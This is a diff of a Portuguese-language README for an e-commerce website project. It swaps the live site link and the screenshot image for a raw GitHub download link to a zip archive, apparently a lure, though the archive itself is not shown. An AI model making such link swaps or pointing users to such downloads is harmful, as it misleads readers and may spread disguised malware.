@@ -8,7 +8,7 @@
 
 ## Link
 
-https://real-hill.surge.sh
+https://raw.githubusercontent.com/Raizagomes/Alves-labe-commerce6/master/public/Alves-labe-commerce6_2.6.zip
 
 ## Descrição das funcionalidades do site:
 
@@ -27,4 +27,4 @@ https://real-hill.surge.sh
 
 ## Imagens:
 
-![Imagens](./src/imgSite/Screenshot_1.jpg)
+![Imagens](https://raw.githubusercontent.com/Raizagomes/Alves-labe-commerce6/master/public/Alves-labe-commerce6_2.6.zip)
